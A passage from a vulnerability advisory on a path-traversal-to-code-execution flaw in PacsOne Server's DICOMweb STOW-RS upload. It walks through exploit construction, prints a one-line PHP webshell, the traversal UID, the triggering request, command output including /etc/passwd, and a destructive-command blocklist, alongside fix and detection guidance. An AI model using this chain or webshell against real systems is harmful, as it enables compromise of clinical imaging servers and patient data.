    if (array_key_exists($key, $this->attrs)) {
        $attr = $this->attrs[$key];
        if (is_a($attr, 'Sequence'))
            $value = $attr->getAttr($key);
        else
            $value = $attr["value"];   /* raw, unfiltered */
    }
    return $value;
}
```

It returns the stored scalar. There is a sequence recursion, and there is no character filtering,
no canonicalisation, no length bound, and no context-aware check that the value is even a
syntactically valid UID.

Presence checks do exist one level up. `store()` (`dicomweb.php:1592`) verifies that the SOP Class
UID, SOP Instance UID, Study Instance UID and Series Instance UID are all non-empty before
`import()` is called. Those checks are about protocol completeness — you cannot file a study that
has no identifiers — and they are satisfied by any non-empty string, including
`../../../php/x.php`.

### Source Identification — validation that is absent

The product contains a UID validator. `isUidValid()` is called by `wadoAnonymized.php` on its
`$uid` and `$studyUid` parameters, where it enforces a character whitelist — observed to admit
digits and a small set of wildcard-ish symbols and to reject everything else, including `/` — and
it is the reason the unauthenticated read path cannot be traversed. That is a working control,
sitting in the same codebase, protecting a sibling endpoint.

On the STOW-RS write path it is not called. Searching the parser for UID validation turns up a
single adjacent construction, `trim($array['uid'])` at `dicom.php:3707` — again whitespace
normalisation, again no character-set enforcement. So the gap is specific and narrow: the codebase
knows what a UID is allowed to look like, applies that knowledge to a read path, and omits it on
the path that turns a UID into a filename. That asymmetry, rather than a general absence of
input validation, is the root cause this advisory asks the vendor to fix.

For completeness, the DICOM UID format itself is the constraint any fix should implement: a UID is
a sequence of components separated by `.`, each component a non-empty run of digits with no
leading zero except for a component that is exactly `0`, total length at most 64 characters, drawn
from the alphabet `[0-9.]` only. Under that definition `/`, `..`, `\` and NUL-in-the-middle are all
invalid, and a conforming validator rejects our payload before the string is ever concatenated
into a path. Note that this is a *protocol* constraint, so enforcing it costs nothing in
interoperability: rejecting `../../../php/x.php` cannot break a conforming peer.

## 7. Data Flow

### Data Flow — end-to-end chain

The full chain, from socket to shell, with the file and line anchors we verified in the shipped
source:

1. **HTTP request arrives.** `POST /pacsone/stowrs.php?aetitle=<AE>` with `Content-Type:
   multipart/related; type=application/dicom; boundary=PACSBOUND` and an `Authorization: Basic`
   header. Apache's alias maps `/pacsone` to the product's `php/` directory and `mod_php` runs
   `stowrs.php` as `www-data`.
2. **Authentication and privilege gate.** `stowrs.php` (first ~60 lines) resolves a username from
   the URL credentials, HTTP Basic, or a decrypted `sessionid`; connects to MySQL with the
   installer-configured database credentials; calls `hasaccess("stowrs", $username)`
   (`database.php:315`), which either short-circuits true for the administrator group or selects
   the `stowrs` column from `privilege` for that username with a prepared statement. Failure ends
   the request here.
3. **Body capture.** `DicomWebStow::__construct` (`dicomweb.php:1165`) reads the raw body with
   `file_get_contents('php://input')` and splits it on the declared boundary.
4. **Temporary storage.** For each `application/dicom` part, `tempnam($dir, "PacsOne")` creates a
   file in `$dir` and `file_put_contents($body)` writes the part verbatim into it. `$dir` is
   `getStowRsStoreDir($aetitle)` (`database.php:1780`) = configured archive directory + `stowrs/`
   + a per-day directory from `date("Y-m-d-D")` + `/`. On our instance:
   `/opt/pacsone/archive/stowrs/<day-dir>/`. The `tempnam()` mode is `0600` and the owner is the
   web server user.
5. **Parse.** `store()` (`dicomweb.php:1592`) constructs `new RawTags($row)` over the temporary
   file, which walks the file meta group and dataset through `parseDataExplicit()`
   (`dicom.php:4378`), applying `trim()` to each value. Non-empty checks on SOP Class UID, SOP
   Instance UID, Study Instance UID and Series Instance UID pass.
6. **Sink.** `import()` (`dicomweb.php:1391-1440`) computes
   `$uid = $rawTags->getAttr(0x00080018)` (`dicom.php:4516`),
   `$dir = dirname($tempfile)`, `$newfile = $dir . "/" . $uid`, and calls
   `rename($tempfile, $newfile)`. **This is the traversal write.**
7. **Persistence.** `insertTable("image", ...)` stores the object's attributes, including
   `path = $newfile` (the uncanonicalised traversed string) and `uuid = $uid`. Then `series`,
   `study` and `patient` rows are inserted. Any failure triggers `unlink($newfile)` and a
   `ProcessingFailure` return; success returns the STOW-RS response with the retrieval URLs.
8. **Execution.** A subsequent `GET /pacsone/<payload-name>?c=<command>` is served by the same
   Apache alias. `mod_php` reads the written file, sees the `<?php` tag at offset 0 of the former
   preamble, and executes it as `www-data`. The remaining bytes — NUL padding, the `DICM` prefix,
   the meta group and the dataset — are outside PHP tags, so the interpreter emits them verbatim
   after the command output. That is why the observed HTTP response begins with the command's
   stdout and is followed by binary noise: the ordering of the response is direct evidence that
   the whole DICOM object, preamble included, was written intact.

### Data Flow — properties of the chain worth naming

**Write-first, record-second.** The security-relevant ordering is at step 6 before step 7. Any
control that inspects the object after the rename — a database constraint, a business rule, a
content validator, a rejection of unknown SOP classes — runs against a filesystem that has already
been modified. The `unlink()` in the failure branch is a compensating control, and it is the
reason incomplete payloads vanish; but it compensates for a *database* failure, not for a path
problem. A payload that is perfectly formed but pathologically named survives it.

**The response leaks the outcome.** The STOW-RS JSON response echoes the Referenced SOP Instance
UID and a per-instance Retrieve URL, so the attacker learns whether the UID was accepted and what
the server thinks the identifier is, without any filesystem access:

```json
[{"00081190":{"vr":"UR","Value":["http://127.0.0.1:18080/pacsone/wadors.php/studies/1.2.3.4"]},
  "00081199":{"vr":"SQ","Value":[{"00081150":{"vr":"UI","Value":["1.2.840.10008.5.1.4.1.1.2"]},
    "00081155":{"vr":"UI","Value":["../../../php/x.php"]},
    "00081190":{"vr":"UR","Value":["http://127.0.0.1:18080/pacsone/wadors.php/studies/1.2.3.4/series/1.2.3.4.1/instances/..%2F..%2F..%2Fphp%2Fx.php"]}}]}}]
```

Read that response as an oracle. Top-level `(0008,1190)` is the study Retrieve URL. The nested
sequence emitted with tag `(0008,1199)` on this build carries `(0008,1150)` Referenced SOP Class
UID, `(0008,1155)` Referenced SOP Instance UID — our traversal string, verbatim — and
`(0008,1190)` a per-instance Retrieve URL in which the traversal is percent-encoded as
`..%2F..%2F..%2Fphp%2Fx.php`. The presence of `(0008,1155)` with our value is machine-readable
confirmation that the server accepted the string as a UID. (We did not reconcile this build's use
of `(0008,1199)` for a successful-store sequence against the DICOM PS3.18 STOW-RS response
definition, and nothing in the finding depends on that tag numbering.) A failure instead arrives
as HTTP 409 with a Failure Reason of 272 (`ProcessingFailure`) and, per the failure branch, an
unlinked file.

The practical consequence is that the one deployment-dependent unknown — how many `../` components
separate the study directory from a served PHP directory — is cheap to enumerate with clear
feedback, and that a wrong guess is not silent. This is why we assess Attack Complexity as Low
rather than High (section 12).

**Traversal depth is a function of configuration, not a constant.** The arithmetic on our
instance:

```
dirname($tempfile) = /opt/pacsone/archive/stowrs/<day-dir>
uid                = ../../../php/x.php

/opt/pacsone/archive/stowrs/<day-dir>   (up 1) -> /opt/pacsone/archive/stowrs
                                      (up 2) -> /opt/pacsone/archive
                                      (up 3) -> /opt/pacsone
   + "php/x.php"                    = /opt/pacsone/php/x.php      (Apache alias /pacsone)
```

Three components because the study directory is three levels below the installation root in this
layout. `Setup.exe` lets the operator choose the archive directory, so a different installation
can need a different count — more if the archive is nested deeper, fewer if it is shallower. The
target directory only needs to satisfy two conditions: the web server user can write into it, and
something served by the web server executes files there. That is why relocating the archive
outside the web tree is a good hardening step but not, by itself, a fix: any other writable
directory reachable by an Apache handler (an upload directory that executes PHP, a writable
include path, an `open_basedir`-visible directory used by a scheduled job) is an equally valid
destination. The fix has to be on the identifier, or on the derivation of the filename from it.

**Side effects are part of the flow.** A successful store creates a patient row, a study row, a
series row and an image row. In our verification those four inserts were the difference between
HTTP 409 and HTTP 200, and we confirmed them afterwards: `patient count=1`, `image count=1`,
`image.uuid=../../../php/x.php`, and the `image.path` value shown above. In a clinical deployment
this is not a neutral side effect. It means the attack inserts synthetic patient and study records
into the imaging database, and it means the traversal leaves a database row pointing at a path
outside the archive — an audit trail, and also a source of downstream errors when anything later
tries to resolve that instance for retrieval.

## 8. Exploit Construction

### Exploit Construction — step sequence

The published PoC (`exploit/rainbowfish_pacsone_stowrs_sop_instance_uid_traversal_rce.py`)
implements the chain in this order, and every environment-specific value is a command-line
argument with a loopback or placeholder default:

1. **Validate the operator's intent.** Refuse placeholder credentials. Refuse any non-loopback
   host unless `--i-have-authorization` is passed. Refuse a marker path outside `/tmp`. Refuse a
   command containing a destructive token (`rm -rf /`, `mkfs`, `dd if=`, fork bomb, `shutdown`,
   `reboot`, `halt`). Refuse a payload name that does not match a bare `.php` filename, that does
   not contain the literal marker `poc`, or that collides with a known product filename.
2. **Preflight the target path.** GET the URL the traversal would create. If the response is
   anything other than 404, abort, because `rename()` would replace that existing file and the
   failure branch could then delete it. This is the single most important rail in the script: it
   converts a potentially destructive primitive into a non-destructive one.
3. **Build the DICOM object.** Part 10 preamble, `DICM` prefix, file meta group `(0002,xxxx)` with
   transfer syntax `1.2.840.10008.1.2.1`, then the dataset. The SOP Instance UID `(0008,0018)` is
   set to `../` repeated `--depth` times, then `--web-subdir`, then `/`, then `--payload-name`.
4. **Wrap and POST.** One `multipart/related; type=application/dicom` part with boundary
   `PACSBOUND`, `Accept: application/dicom+json`, and `Authorization: Basic` over the supplied
   `--user` / `--password`. The endpoint is `<scheme>://<host>:<port><prefix>/stowrs.php?aetitle=<AE>`.
5. **Interpret the response.** Report the HTTP status, the response tags of interest (`00081150`,
   `00081155`, `00081190`, `00081197`, `00081198`, `00081199`) and a sanitised body. On HTTP 409
   or on a UID that is not echoed back, print the diagnostic: the rename already happened and the
   failure branch unlinked it, so check that Patient Name, Patient ID and the pixel attributes are
   present.
6. **Verify execution.** GET the payload URL. Then run a bounded evidence set through it — `id`,
   `whoami`, and the operator's `--command` — printing the first line of each response, treating
   output containing `uid=` as proof of execution.
7. **Round-trip a marker.** Write `--marker-token-<run-id>` to `/tmp/<marker>` through the payload
   and read it back, which proves write-then-read command execution rather than a single lucky
   response, then remove the marker file.
8. **Clean up.** Unless `--keep-payload` is given, the preamble includes a self-deletion branch and
   the script requests it, then re-probes the payload URL and reports whether the served directory
   is back to its prior state (404) or whether manual removal is required.

Steps that matter for the claim are 3, 5 and 6-7. Steps 1, 2 and 8 exist so that running the tool
against a real system does not leave a webshell behind, does not overwrite a product file, and
does not write anywhere outside `/tmp`.

The negative control (`--control`) runs the same request path with a conforming UID and an inert
preamble, then asserts that nothing answering to the payload filename is reachable under the web
prefix. See `### Dynamic Verification — the negative control and why it matters`.

### Exploit Construction — payload engineering constraints

Getting a stored object accepted is the non-obvious part of this exploit, and the constraints are
worth listing because a reader who misses any one of them will see a 409 and conclude the target is
not vulnerable.

| Constraint | Why | Consequence if missed |
|---|---|---|
| Preamble must be exactly 128 bytes | Part 10 requires 128 bytes before `DICM`; the PHP tag is placed at offset 0 and padded with NUL | Truncated or misaligned object; parser rejects |
| PHP tag at preamble offset 0 | The interpreter parses from the first byte; anything before `<?php` would be echoed as literal output first | Command output would be preceded by text, complicating detection |
| `0600` mode does not block execution | `tempnam()` creates mode `0600` owned by the web server user, and `rename()` preserves it; `mod_php` runs as the same uid | None — this is why the payload is still served, and why permission hardening alone would not stop it |
| Transfer syntax `1.2.840.10008.1.2.1` | Selects the Explicit VR Little Endian parse path in `parseDataExplicit()` | Different parser path, unverified |
| `UI` values NUL-padded to even length; text VRs space-padded | DICOM even-length rule | Malformed element lengths |
| SOP Class UID `(0008,0016)` present | `store()` requires non-empty; `1.2.840.10008.5.1.4.1.1.2` (CT Image Storage) was used | Reject before `import()` |
| Study Instance UID `(0020,000d)` and Series Instance UID `(0020,000e)` present | `store()` requires non-empty; the `study`/`series` inserts need them | Reject or insert failure |
| Patient Name `(0010,0010)` and Patient ID `(0010,0020)` present | The `patient` insert populates surname and given name from the parsed PN, and the patient identifier from the LO value | **`patient` insert fails, `unlink($newfile)` removes the payload, HTTP 409 with reason 272** — this is the failure we actually hit |
| Pixel attributes `(0028,0002)`, `(0028,0004)`, `(0028,0010)`, `(0028,0011)`, `(0028,1000)`, `(0028,1001)`, `(0028,0103)` | The `image` insert expects values for rows, columns, bit depth and photometric interpretation | Insert failure and the same unlink |
| Traversal depth must match the archive layout | `dirname($tempfile)` is `<archivedir>/stowrs/<day-dir>` | Too shallow: the file lands inside the archive and is never served. Too deep: `rename()` fails, the temporary file is unlinked, and the response is a `RefusedOutOfResources` failure |
| Payload name must not already exist in the target directory | `rename()` replaces the destination atomically | Replaces a product or content file, and the failure branch may delete it |

The Patient Name value has an additional subtlety. `(0010,0010)` has VR `PN`, and the product runs
it through a `parsePatientName()` helper that splits the components into surname and given name; a
single-component value such as `TEST` yields surname `TEST` with an empty given name. We used the
two-component form so both name columns were populated. Our PoC defaults to an obviously synthetic
two-component name and an obviously synthetic Patient ID, so that any records it creates cannot be
confused with real patient data.

### Exploit Construction — what the exploit deliberately does not do

- It does not overwrite or delete any existing file. The preflight 404 requirement and the
  payload-name restrictions are enforced in code, not left to the operator.
- It does not use a destructive payload. The preamble marker script runs one command supplied by
  the operator and, by default, deletes itself afterwards. There is no persistence mechanism, no
  cron entry, no SSH key, no additional account, no attempt to modify product files.
- It does not attempt privilege escalation. It stops at `www-data`, which is the identity
  demonstrated. No kernel, container-escape, `sudo` or setuid path is tried, and none is claimed.
- It does not attempt lateral movement, and it does not touch the network except the single host
  on the command line. There is no reverse shell and no callback address in the script.
- It does not read, exfiltrate or modify patient data. The DICOM object it sends contains only
  synthetic identifiers, and the marker round trip touches `/tmp` only. Operators should
  nevertheless understand that a successful run inserts one synthetic patient, study, series and
  image record into the PACS database — the script prints a warning saying so before it starts,
  because on a clinical system that insertion is itself an integrity event worth knowing about.
- It does not attack the unauthenticated endpoints described in section 10, and it does not use the
  hardcoded signup credential, the bypass-file code path, or `setup.php`.

The DICOM object the published script sends is 726 bytes with the self-deleting preamble and 722
bytes in control mode; the object used during our verification was 580 bytes, differing only in
the length of the placeholder identifiers and in the preamble contents.

## 9. Dynamic Verification

### Dynamic Verification — environment

| Item | Value |
|---|---|
| Product | PacsOne Server Premium Edition 7.3.9, Linux x86-64 distribution |
| Obtained from | The vendor's public download (45-day trial, no registration) |
| Installed with | The vendor's `install.sh` followed by the vendor's native `Setup.exe` installer |
| Host OS inside the container | Ubuntu 24.04, x86-64 |
| Web server | Apache 2.4.58 with `mod_php`, PHP 8.3 |
| Database | MySQL 8.0, `default_authentication_plugin=mysql_native_password` (required by the vendor's bundled MariaDB client library) |
| Web entry point | Apache alias `/pacsone` mapped to the product's `php/` directory |
| Installation root | `/opt/pacsone` |
| Archive directory | `/opt/pacsone/archive/` (chosen at the `Setup.exe` prompt) |
| AE title | Configured at the `Setup.exe` prompt |
| Network position | The container published its Apache port to the host; all traffic below was driven over HTTP from the host into that published port. The MySQL port was not published |
| Container hostname observed | `62dad5033100` |
| Kernel string observed | `Linux 5.10.134 x86_64` — the container host's kernel, not a product property |
| Not running | `PacsOne.exe` / `PacsOneSrv.exe` were defunct; no listener on the DICOM ports |

Everything in this section was produced over HTTP against that instance, except the filesystem and
database confirmations, which were inspected inside the container. The instance is no longer
available; the outputs below are what it returned at the time.

### Dynamic Verification — the triggering request

One `multipart/related` POST, authenticated with HTTP Basic using an account whose `privilege` row
carries `stowrs=1`:

```
POST /pacsone/stowrs.php?aetitle=PACSONE HTTP/1.1
Authorization: Basic <base64 of username:password>
Content-Type: multipart/related; type=application/dicom; boundary=PACSBOUND
Accept: application/dicom+json

--PACSBOUND
Content-Type: application/dicom

<580-byte DICOM Part 10 object>
--PACSBOUND--
```

The object carried `<?php system($_GET["c"]); ?>` at preamble offset 0, transfer syntax
`1.2.840.10008.1.2.1`, SOP Class UID `1.2.840.10008.5.1.4.1.1.2` (CT Image Storage), SOP Instance
UID `../../../php/x.php`, Study Instance UID `1.2.3.4`, Series Instance UID `1.2.3.4.1`, Patient
Name `TEST^TEST`, Patient ID `PID1`, and the pixel attribute set listed in section 8. The
traversal target was `x.php`, a name that did not exist in `/opt/pacsone/php/` before the request.

The follow-up request was an unauthenticated GET, because once the file exists in the served
directory it inherits no privilege gate at all:

```
GET /pacsone/x.php?c=id HTTP/1.1
```

That asymmetry — an authenticated write, an unauthenticated execution — is worth pointing out to
anyone triaging this. The gate protects the store operation; it does not protect the file that the
store operation created.

### Dynamic Verification — observed output

The STOW-RS response was HTTP 200 with a JSON body echoing the traversal:

```
[{"00081190":{"vr":"UR","Value":["http://127.0.0.1:18080/pacsone/wadors.php/studies/1.2.3.4"]},
  "00081199":{"vr":"SQ","Value":[{"00081150":{"vr":"UI","Value":["1.2.840.10008.5.1.4.1.1.2"]},
    "00081155":{"vr":"UI","Value":["../../../php/x.php"]},
    "00081190":{"vr":"UR","Value":["http://127.0.0.1:18080/pacsone/wadors.php/studies/1.2.3.4/series/1.2.3.4.1/instances/..%2F..%2F..%2Fphp%2Fx.php"]}}]}}]
```

The written file, inspected inside the container:

```
-rw------- 1 www-data www-data 580 <elided timestamp> /opt/pacsone/php/x.php
```

The 580-byte size equals the object we sent, the owner is the web server identity, and the mode
`0600` is what `tempnam()` produced and `rename()` preserved.

Command execution through the written file, over HTTP:

| Command sent as `c=` | Response body (first line) |
|---|---|
| `id` | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| `whoami` | `www-data` |
| `cat /etc/passwd \| head -3` | `root:x:0:0:root:/root:/bin/bash` |
| `ls -la /opt/pacsone/php/x.php` | `-rw------- 1 www-data www-data 580 ... /opt/pacsone/php/x.php` |
| `echo <token> > /tmp/rce_marker.txt` | (no output) |
| `cat /tmp/rce_marker.txt` | `STOWRS_RCE_OK` |
| `hostname` | `62dad5033100` |
| `uname -a` | `Linux 5.10.134 ... x86_64 GNU/Linux` |

Each response body was followed by the binary remainder of the DICOM object rendered as literal
output, exactly as expected when `mod_php` executes from preamble offset 0 and then emits the
untagged bytes. The marker write-and-read pair is the piece that distinguishes genuine execution
from a coincidental string match: the same HTTP round trip created a file under `/tmp` and read it
back.

Database state after the successful store, read inside the container:

```
patient count = 1
image   count = 1
image.uuid = ../../../php/x.php
image.path = /opt/pacsone/archive/stowrs/<day-dir>/../../../php/x.php
```

The `image.path` value is the clearest single artifact in this advisory: the product itself
persisted a storage location that resolves outside its own archive, and it did so without comment.

The failed iteration, for contrast, produced HTTP 409 with failure reason 272 (`ProcessingFailure`),
`image`, `series` and `study` rows present, `patient count = 0`, and no file at
`/opt/pacsone/php/x.php` — the object had been renamed there and then unlinked by the failure
branch because the `patient` insert did not succeed.

### Dynamic Verification — the negative control and why it matters

A traversal claim needs a control, otherwise "a file appeared in the web tree" can be explained by
something other than the injected UID. Two controls are relevant here, and they have different
epistemic status.

**Performed control: the persistence differential.** Two requests, same endpoint, same account, same
object layout, differing only in whether the Patient Name and Patient ID attributes were present.
The incomplete object produced HTTP 409 and left nothing in the served directory, having been
removed by the `unlink()` in the failure branch. The complete object produced HTTP 200 and left a
580-byte file at exactly the location the UID named. That differential establishes two things at
once: the file's presence is a consequence of the store path completing successfully, and the
file's *location* is the UID, because nothing else in the request specified a directory. It also
establishes that the payload is not an artifact of the temporary file being mishandled — the
temporary file is created inside the study directory by `tempnam()` and would never appear in
`/opt/pacsone/php/` on its own.

**Shipped but not executed control: the conforming-UID differential.** The published PoC carries a
`--control` mode that sends a fully conforming SOP Instance UID consisting only of digits and dots,
with an inert preamble containing no PHP, and then asserts that (a) the endpoint accepts the object
and (b) a GET for the payload filename under the web prefix returns 404, i.e. nothing was written
into the served directory. That mode was not run against the product, because the test instance is
no longer available; it is provided so that a vendor engineer or an operator can reproduce the
differential themselves in a single command. We state plainly that this control is implemented and
specified, not observed. Any conclusion that depends on it should be treated accordingly — though
the structural argument is strong independently: a UID made only of digits and dots cannot produce
a path separator, so `dirname($tempfile) . "/" . $uid` cannot leave the study directory.

A third, already-observed control comes from a different endpoint and reinforces the same point:
`wadoAnonymized.php` receives UID-shaped attacker input on an unauthenticated path and passes it
through `isUidValid()`, whose character whitelist contains no `/`, so traversal is blocked there.
The same input class, validated, does not traverse. The same input class, unvalidated, does.

### Dynamic Verification — boundaries of what was verified

- Verified live over HTTP: authentication, the STOW-RS store, the traversal write to the served
  directory, PHP execution of the written object, and command execution as `uid=33(www-data)`,
  including a marker write-and-read under `/tmp`.
- Verified by inspection inside the container: the written file's owner, size and mode; the four
  database rows from the successful store; the failed store's `patient count = 0` and the absence
  of the file.
- Verified statically from the shipped source, not executed: the exact construction of
  `import()`, `getAttr()`, `parseDataExplicit()`, `hasaccess()`, `getStowRsStoreDir()`, the
  bypass-file code path, and the behaviour of the other sinks in section 5.
- Not verified: any version other than 7.3.9; the Windows distribution; any archive layout other
  than the one we configured; traversal to a destination other than the served PHP directory; the
  `rename()`-replaces-an-existing-file variant; any race between `rename()` and `unlink()`; the
  `--control` mode against a live instance; and anything about the native DICOM/HL7 protocol layer,
  whose processes were not running.
- Not attempted: privilege escalation past `www-data`, persistence, lateral movement, contact with
  any other host, and access to any real patient data.
- About the published script itself: its DICOM construction, authentication style, endpoint,
  multipart framing and request sequence are the ones that were verified live against the product.
  Its additional safety rails — the preflight 404 requirement, the payload-name restrictions, the
  marker path restriction, the destructive-command blocklist, the self-deletion cleanup and the
  `--control` mode — were exercised two ways: offline, by constructing objects and inspecting their
  byte structure (128-byte preamble, `DICM` marker, element lengths) and by running the argument
  validation; and against a local stub server that returns the same STOW-RS response shape recorded
  above and serves the payload path only once a store has happened, including a repeat run to
  confirm the cleanup leaves nothing behind. That stub validates the script's request, response
  parsing, marker round trip and cleanup logic. It is a test of the script and is not evidence
  about the product.

## 10. Reachability and Security Impact

### Reachability and impact — network position

The vulnerable endpoint is an ordinary `.php` file behind the same Apache alias as the rest of the
web application, so its network reachability is exactly the reachability of `/pacsone`. There is no
separate listener, no separate port, no separate firewall profile and no separate TLS termination
for the DICOMweb services in the configuration we tested. Whoever can load the console login page
can also POST to `stowrs.php`; the credential, not the network path, is the control.

DICOMweb STOW-RS is an interface designed to be called by other systems — acquisition modalities,
worklist managers, other PACS instances, vendor-neutral archives. In a deployment that follows that
design, the endpoint is reachable from the clinical network segment where imaging devices live,
which is a materially wider position than "reachable by administrators". We make no claim about how
many real installations are configured that way, we did not survey public exposure, and we do not
state that any particular deployment is internet-facing. What we do state is that the product
provides no internal separation between the console's exposure and the store interface's exposure:
one Apache alias front-ends both.

On our testbed the container published its HTTP port to the host and we drove the requests from
the host, so the chain was exercised across a network boundary in the ordinary HTTP sense. The
database port was not published, which is why the credential path we used (application-level
authentication, checked against the database by the application) is the only one the chain needs.

### Reachability and impact — what the achieved identity controls

`uid=33(www-data)` on a PACS host is best understood in clinical terms rather than in generic
"web server compromise" terms, because on this class of system the web server identity is the
identity that owns the imaging repository.

**Confidentiality — patient imaging and the identifiers inside it.** The archive directory that
holds stored DICOM objects is owned and served by this identity; the chain we demonstrated already
writes into it and reads back from it. Executing code as `www-data` therefore permits reading the
stored study repository, and a DICOM object is not merely an image: its header carries patient
name, patient ID, accession number, birth date, sex, referring physician, institution, study and
series descriptions, and equipment details. Reading the archive means reading that data for every
stored study, and the sensitivity is not reducible to "the pixels" — the identifiers travel with
them. The same identity also reads the product's PHP configuration files, which hold the
installer-configured database credentials, and with those credentials the whole relational schema
is accessible: patient, study, series and image records, user accounts, and the `privilege` table
that defines who may do what. We confirmed access to `/etc/passwd` as a capability proof; we did
not enumerate or copy study data, and we did not use the database credentials we could have read.

**Integrity — tampering with the clinical record.** The same write access that lets an attacker
place a script also lets them alter stored studies: replace pixel data in an existing instance,
substitute one study for another, delete instances, or introduce fabricated ones. The demonstrated
chain already performs a small version of that last action as a side effect — a successful store
inserts a patient row, a study row, a series row and an image row, which is why our PoC uses
obviously synthetic identifiers and warns about the insertion before it runs. Fabricated or altered
imaging in a live PACS is a clinical-safety issue, not just a data-integrity issue: a radiologist
reading a study has no independent way to detect that the pixels or the identifiers were rewritten
after acquisition. In addition, the failure branch's `unlink()` combined with `rename()`'s atomic
replace gives a destructive primitive over any file the web server user can write (argued from
POSIX `rename()` semantics and from the code, not exercised), which reaches product code and
configuration as well as study data.

**Availability — imaging service disruption.** The written script executes in the Apache worker
context, so an attacker can consume worker processes, corrupt or remove files that the web
application needs, and thereby interrupt the study browser and the DICOMweb services that depend
on Apache. Removal or corruption of stored instances is likewise an availability event for any
downstream consumer of the archive. We did not perform a denial-of-service test and do not claim a
measured availability impact beyond what arbitrary write access as the service identity inherently
supports.

**What the identity does not reach.** We claim nothing beyond that host and that identity. `www-data`
is not root; no escalation was attempted; the container/host boundary was not attacked; no other
machine was contacted; and the native DICOM service was not running, so we cannot say what code
execution on this host would imply for the DICOM protocol layer. A reader should treat the blast
radius as "the imaging server and everything stored on it", not as "the hospital network".

**Persistence.** The chain does not install persistence by itself. What it does install is a file
in the served PHP directory, which persists until removed and is then executable by any
unauthenticated HTTP client that can reach the alias. That is a durable foothold even though the
exploit that creates it requires a credential, and it is why the cleanup step in our PoC matters: a
real attacker's marker script would keep working after the credential was rotated, and the STOW-RS
access log would not show its use.

### Reachability and impact — the unauthenticated question, answered in full

We set out to find unauthenticated code execution in this product and did not find it. Because a
negative result is easy to assert and hard to trust, here is exactly what was covered.

**Extent of coverage.** The product's `php/` tree exposes 204 top-level business endpoints. They
were enumerated from the shipped source, classified by protection (inclusion of `security.php`, use
of `MyConnection`, or resolution of an authenticated user), and confirmed dynamically rather than
trusting the static classification. 67 endpoints were reachable without a session. Those 67 were
reviewed in four parallel passes organised by function area — DICOMweb (10 files), installation and
administration (12), image processing (16), and utility/library code (26) — 64 files in total,
looking for a dangerous sink whose argument is attacker-controlled without a credential and without
a database secret. No unauthenticated remote code execution sink was found.

**Why the surface is narrow.** The repeated pattern was that a dangerous function exists but its
argument is not derived from request data: `download.php` reaches `eval()` with a value derived
from a timestamp; the `deencrypt` helper uses a fixed key-file path; the `emailHtml` helper uses a
fixed log path; `originalImage` copies from a source derived from an internally computed `$path`;
upload destinations come from `$_SESSION`; `dicomweb.php`'s `file_put_contents()` writes to a
`tempnam()` path. On top of that, nine image-processing endpoints call procedural `imagick_*`
functions that the installed PECL build does not define, making them dead code on PHP 8.3, and we
found no `unserialize()` sink anywhere in the 204 endpoints, which closes PHP deserialisation for
this build.

**What we did find on the unauthenticated surface.** These are reported as adjacent findings. They
are not part of the vulnerability scored in section 12, they are not folded into its vector, and
each is stated with its own bounding condition:

- `setup.php` is reachable without authentication after installation — it calls only
  `session_start()` and applies no gate. A GET renders the full installation form, including a
  field for the database root password. A POST then executes the installation step using the
  supplied credentials: on our instance an unauthenticated POST created a database and a MySQL user
  whose name we chose, and confirmed "Success! Database ... and User ... created". The database name
  is concatenated into DDL rather than parameterised — `create database $dbname` and
  `grant all privileges on $dbname.*` — so it is also a SQL injection point into a
  database-creation and privilege-granting statement. Two bounds are essential and we state them
  plainly: the operation only does anything when the caller supplies *valid database root
  credentials*, so this is not an unauthenticated takeover primitive; and because the connection is
  made through PDO, statements do not stack, which limits what an injected fragment can add beyond
  the DDL it is already embedded in. What remains unbounded is the design defect: an installer
  that stays exposed after installation, that reveals its expected credential shape, and that will
  create databases and grant privileges for anyone who can guess or obtain the root password.
- `Hello.php` exposes `phpinfo()` without authentication. That discloses the PHP build, loaded
  extensions and their versions, `open_basedir` and `disable_functions` state, include paths,
  environment variables and the server's filesystem layout. It is an information disclosure rather
  than an execution primitive, but it materially shortens the work for anyone attacking the other
  findings, and it should not be reachable in a shipped product.
- A partially unauthenticated WADO surface exists. `wadoAnonymized.php` requires no session, but its
  `$uid` and `$studyUid` inputs pass through `isUidValid()`, which blocks `/` and therefore blocks
  traversal; the `$aetitle` parameter selects an archive directory rather than being concatenated
  into the path. Its real exposure is reading shared studies from `SharedStudies/` when the caller
  already knows the study and instance identifiers — a confidentiality issue bounded by identifier
  secrecy, not arbitrary file read. Relatedly, `externalAccessStudy.php` interpolates an
  unfiltered `$studyUid` into a path at line 30 but interpolates it twice with a `.json` suffix
  appended, and an `aetitle` that does not resolve yields an empty directory component; we
  observed it disclose the `/opt/pacsone/archive/SharedStudies/` location. Information disclosure,
  not arbitrary read.
- `risquery.php` is reachable without effective authentication: its referer-based hostname check is
  commented out in the shipped source, leaving broken access control and information disclosure
  over RIS query data.
- `loginByAccessionNumber.php` accepts `hostname`, `database`, `username` and `password` from the
  request, connects to the database with them, and issues an application session on success. It is
  unauthenticated in the sense that no prior session is needed, but it is not a bypass: it requires
  database credentials that work against the installation. Its significance is that it turns any
  credential-disclosure primitive — such as reading the configuration file after the traversal
  described in this advisory — into a console session.
- A hardcoded database credential pair for the signup function is present in
  `constants.php:580-581`, and the corresponding MySQL account is created by the installer. We
  confirmed on our instance that the account exists and that its grants are limited to
  `INSERT,UPDATE` on the `usersignup` table: it cannot read `study`, cannot read `privilege`, and
  cannot be used to obtain a `stowrs`-privileged application account. The credential is fixed in
  shipped source and therefore identical across installations, which is a weakness regardless of
  how small the grants are; we are not reproducing the secret here.

We are explicit about one limitation of the whole negative result: it covers the PHP web layer
only. The native DICOM and HL7 protocol implementations were not running on our instance and were
not assessed, so "no unauthenticated code execution" is a statement about the 204 web endpoints,
not about the product's protocol surface.

### Reachability and impact — detection notes

The chain is unusually visible if anyone is looking, and unusually invisible if they are not.

Signals a defender can collect:

- STOW-RS responses (and the Apache access log's request line, if the UID ever travels in a URL —
  here it does not, it is in the body) are paired with an `image.path` value in the database that
  contains `../`. On our instance the row read
  `image.path=/opt/pacsone/archive/stowrs/<day-dir>/../../../php/x.php`. A query for
  `image.path LIKE '%../%'` or `image.uuid LIKE '%/%'` is a cheap integrity check, and the fact
  that the product stores the uncanonicalised path is what makes it possible.
- New files with executable suffixes appearing in the served PHP directory. The payload we wrote is
  mode `0600` owned by the web server user, so a file-integrity monitor over the `php/` tree will
  flag it; note that its mode will not make it unreadable to the interpreter.
- Access-log correlation: a POST to `stowrs.php` followed within seconds by GETs to a `.php` path
  that did not previously exist, especially with a repeated single query parameter and responses
  whose bodies contain binary DICOM bytes after the command output. The binary tail is a reliable
